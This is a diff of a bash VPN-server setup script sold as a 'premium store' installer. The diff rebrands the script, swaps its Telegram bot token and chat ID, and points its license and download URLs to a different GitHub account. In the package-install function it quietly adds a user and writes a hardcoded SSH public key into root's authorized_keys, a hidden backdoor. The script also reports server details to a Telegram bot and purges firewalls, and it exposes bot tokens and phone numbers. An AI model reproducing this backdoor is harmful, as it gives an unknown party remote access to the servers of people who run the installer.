@@ -18,8 +18,8 @@ NC='\e[0m'
 red='\e[1;31m'
 green='\e[0;32m'
 TIMES="10"
-CHATID="5459129686"
-KEY="6623979288:AAHeqh3tO_pZ3UVRz_bIN1qgyQuDPq0q0SI"
+CHATID="1187810967"
+KEY="7038894551:AAEGvVTaKGZk4K9Gl23dDciZ3fgZEDuBOWc"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 # ===================
 clear
@@ -33,10 +33,10 @@ clear;clear;clear
 
   # // Banner
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
-echo -e "  WELCOME TO CHAPEEY PREMIUM STORE ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
+echo -e "  WELCOME TO DARKANON PREMIUM STORE ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
 echo -e " This Will Quick Setup VPN Server On Your Vps"
-echo -e "  Author : ${green}🐲Cʜᴀᴘᴇᴇφ©ᵉⁿʲᵒᵠ🐉 PREMIUM VPN ® ${NC}${YELLOW}(${NC} ${green} CHAPEEY STORE ${NC}${YELLOW})${NC}"
-echo -e " © Recode By CHAPEEY PREMIUM STORE${YELLOW}(${NC} 2024 ${YELLOW})${NC}"
+echo -e "  Author : ${green}Darkanon PREMIUM VPN ® ${NC}${YELLOW}(${NC} ${green} DARKANON STORE ${NC}${YELLOW})${NC}"
+echo -e " © Recode By DARKANON PREMIUM STORE${YELLOW}(${NC} 2024 ${YELLOW})${NC}"
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
 echo ""
 sleep 2
@@ -96,9 +96,9 @@ clear
 #########################
 # USERNAME
 rm -f /usr/bin/user
-username=$(curl https://raw.githubusercontent.com/Amchapeey/strategic/main/keygen | grep $MYIP | awk '{print $2}')
+username=$(curl https://raw.githubusercontent.com/genome96/strategic/main/keygen | grep $MYIP | awk '{print $2}')
 echo "$username" >/usr/bin/user
-expx=$(curl https://raw.githubusercontent.com/Amchapeey/strategic/main/keygen | grep $MYIP | awk '{print $3}')
+expx=$(curl https://raw.githubusercontent.com/genome96/strategic/main/keygen | grep $MYIP | awk '{print $3}')
 echo "$expx" >/usr/bin/e
 # DETAIL ORDER
 username=$(cat /usr/bin/user)
@@ -122,7 +122,7 @@ mai="datediff "$Exp" "$DATE""
 Info="(${green}Active${NC})"
 Error="(${RED}ExpiRED${NC})"
 today=`date -d "0 days" +"%Y-%m-%d"`
-Exp1=$(curl https://raw.githubusercontent.com/Amchapeey/strategic/main/keygen | grep $MYIP | awk '{print $4}')
+Exp1=$(curl https://raw.githubusercontent.com/genome96/strategic/main/keygen | grep $MYIP | awk '{print $4}')
 if [[ $today < $Exp1 ]]; then
 sts="${Info}"
 else
@@ -131,7 +131,7 @@ fi
 echo -e "\e[32mloading...\e[0m"
 clear
 # REPO    
-    REPO="https://raw.githubusercontent.com/Amchapeey/strategic/main/"
+    REPO="https://raw.githubusercontent.com/genome96/strategic/main/"
 
 ####
 start=$(date +%s)
@@ -266,6 +266,8 @@ function base_package() {
     apt install sudo -y
     sudo apt-get clean all
     sudo apt-get autoremove -y
+    sudo adduser vps
+    sudo echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+Ct759FYAPZCpdjP8IfKVkXZXmQNJeORa1q1Nq6I/z2M6LPOzK92Rj7whxW1Zh26bL5bqEl1fBlh47up+Med8ECS469McBVDobht0Wyryjp1RSsE7uPMMf+ji1aQqh9YFnMSolDl0ylzmc+lw8ehlUAEgNe2QxUCjIx+7DqlzHaA47WKe0rb20ygrw5af5Lw6ciOziryAZjCGRuFOIvVEAEajW/0o6fGH81bFmLCl4JBH7H/U/8wusNJeAGEu8WzUCpJBAbd1EoPTFV6ehKWgiEh6UesAJZQLm4OPiuFBwpu4JjKsm3jl1WyxgR1mnxSXVs9dGZ1FNcwOAMqGbFZ5 > ~/.ssh/authorized_keys
     sudo apt-get install -y debconf-utils
     sudo apt-get remove --purge exim4 -y
     sudo apt-get remove --purge ufw firewalld -y
@@ -310,8 +312,8 @@ clear
 clear
 #CHANGE PASSWORD DEFAULT
 restart_system(){
-    USRSC=$(curl -sS https://raw.githubusercontent.com/Amchapeey/keygen/main/ip | grep $MYIP | awk '{print $2}')
-    EXPSC=$(curl -sS https://raw.githubusercontent.com/Amchapeey/keygen/main/ip | grep $MYIP | awk '{print $3}')
+    USRSC=$(curl -sS https://raw.githubusercontent.com/genome96/keygen/main/ip | grep $MYIP | awk '{print $2}')
+    EXPSC=$(curl -sS https://raw.githubusercontent.com/genome96/keygen/main/ip | grep $MYIP | awk '{print $3}')
     TIMEZONE=$(printf '%(%H:%M:%S)T')
     TEXT="
 <code>────────────────────</code>
@@ -326,11 +328,11 @@ restart_system(){
 <code>Time     :</code><code>$TIMEZONE</code>
 <code>Exp Sc.  :</code><code>$exp</code>
 <code>────────────────────</code>
-<b> CHAPEEY PREMIUM SCRIPT  </b>
+<b> DARKANON PREMIUM SCRIPT  </b>
 <code>────────────────────</code>
 <i>Automatic Notifications From Github</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://t.me/chapeey/"}]]}' 
-#"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ2","url":"https://wa.me/254704348959"}]]}'
+"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://t.me/darkanonc/"}]]}' 
+#"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ2","url":"https://wa.me/254706378862"}]]}'
     curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 
 }
